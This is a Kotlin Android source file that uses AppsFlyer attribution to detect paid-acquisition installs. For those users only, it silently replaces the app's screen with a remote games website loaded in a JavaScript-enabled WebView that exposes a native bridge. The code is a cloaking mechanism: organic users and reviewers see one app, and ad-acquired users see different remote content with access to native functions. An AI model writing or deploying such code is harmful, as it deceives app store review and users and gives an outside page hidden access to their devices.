package com.fs.core

import android.app.Activity
import android.app.Application
import android.net.Uri
import android.util.Log
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib


/**
 * 1.要求 appliccatioin初始化调用
 * 2.实现归因，归因标志写入本地
 * 3.actiity调用传入
 * 4.webview实现 jsInterface
 */

object Advantage {


    private var isAd = false//是不是买量用户
    private var target = "google"
    private var url = "https://www.afun.games/?ch=$target"
    private var aopWork = false

    var afKey=""

    fun init(app: Application, key: String, flag: String) {

        target = flag
        afKey=key
        app.registerActivityLifecycleCallbacks(LifecycleCallback)

        val conversionListener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {

                val str = data?.get("af_status").toString()
                if (!str.isNullOrEmpty() && !str.equals("organic", true)) {
                    isAd = true
                    LifecycleCallback.activity?.get()?.let { activityInit(it) }
                }

            }

            override fun onConversionDataFail(p0: String?) {
            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            }

            override fun onAttributionFailure(p0: String?) {
            }

        }
//        AppsFlyerLib.getInstance().setDebugLog(true)
        AppsFlyerLib.getInstance().init(key, conversionListener, app.applicationContext)
        AppsFlyerLib.getInstance().setMinTimeBetweenSessions(0)
        AppsFlyerLib.getInstance().start(app.applicationContext)
    }


    fun activityInit(activity: Activity) {
        if (isAd && !aopWork) {
            activity.runOnUiThread {
                initView(activity)
            }

        }
    }

    private fun initView(activity: Activity) {
        val webView = WebView(activity)
        val setting: WebSettings = webView.settings
        setting.javaScriptEnabled = true
        setting.javaScriptCanOpenWindowsAutomatically = true
        setting.setSupportMultipleWindows(true)
        setting.domStorageEnabled = true
        setting.cacheMode = WebSettings.LOAD_DEFAULT
        setting.allowContentAccess = true
        setting.databaseEnabled = true
        webView.webChromeClient = WebChromeClient()
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                return false
            }
        }
        webView.addJavascriptInterface(JsBridge(activity), "jsThirdBridge")
        webView.loadUrl(url)
        activity.setContentView(webView)
        aopWork = true

    }

}